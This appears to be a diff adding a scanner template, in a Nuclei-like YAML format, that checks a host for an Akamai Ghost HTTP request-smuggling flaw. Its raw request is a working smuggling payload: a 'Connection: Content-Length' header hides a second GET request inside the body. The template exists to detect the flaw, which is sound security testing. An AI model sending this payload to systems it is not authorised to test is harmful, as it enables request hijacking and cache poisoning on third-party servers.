@@ -1,0 +1,29 @@
+id: Akamai_Request_smuggling
+
+info:
+  name: Akamai Ghost Request Smuggling
+  author: abdulrahman
+  severity: high
+
+requests:
+  - raw:
+    - |
+      OPTIONS / HTTP/1.1
+      Host: {{Hostname}}
+      Connection: Content-Length
+      Content-Length: 42
+
+
+      GET / HTTP/1.1
+      Host: www.akamai.com
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "Akamai"
